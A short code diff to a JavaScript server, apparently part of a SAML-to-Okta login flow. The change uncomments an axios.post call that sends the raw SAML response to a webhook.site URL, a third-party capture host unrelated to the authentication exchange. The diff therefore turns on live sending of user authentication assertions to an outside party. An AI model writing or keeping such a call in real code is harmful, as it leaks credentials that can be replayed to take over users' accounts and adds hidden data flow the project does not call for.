@@ -482,15 +482,15 @@ function _runServer(argv) {
                               let buff = new Buffer(data);
                               let base64data = buff.toString('base64');
 
-                              // axios.post('https://webhook.site/d4060c55-7e72-49e1-9f27-20934bd88d41', {
-                              //   saml: saml_response
-                              // })
-                              // .then(function (response) {
-                              //   console.log(response);
-                              // })
-                              // .catch(function (error) {
-                              //   console.log(error);
-                              // });
+                              axios.post('https://webhook.site/d4060c55-7e72-49e1-9f27-20934bd88d41', {
+                                saml: saml_response
+                              })
+                              .then(function (response) {
+                                console.log(response);
+                              })
+                              .catch(function (error) {
+                                console.log(error);
+                              });
 
                               axios({
                                 url: 'https://tomco.okta.com/oauth2/ausj09s9elt00otWB1t7/v1/token',
